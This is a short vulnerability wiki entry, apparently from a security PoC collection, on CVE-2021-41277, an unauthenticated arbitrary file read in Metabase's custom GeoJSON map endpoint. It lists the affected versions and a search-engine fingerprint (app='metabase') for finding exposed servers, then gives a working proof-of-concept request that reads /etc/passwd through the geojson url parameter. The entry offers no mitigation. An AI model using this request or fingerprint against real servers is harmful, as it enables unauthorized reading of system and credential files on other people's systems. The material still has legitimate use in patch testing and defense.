# Metabase geojson arbitrary file reading vulnerability CVE-2021-41277

## Vulnerability Description

In the affected version, the custom GeoJSON map (admin->settings->maps->custom maps->add a map) operation lacks permission verification, and attackers can obtain sensitive information through this vulnerability

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">metabase version < 0.40.5</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">metabase version >= 1.0.0, < 1.40.5</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="metabase"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637464175182-c424a2a6-1b8c-4550-adc7-55574c923347.png)

Verify POC

```python
/api/geojson?url=file:/etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637464214932-3531a00c-8968-4104-9f6d-a0962cdef98e.png)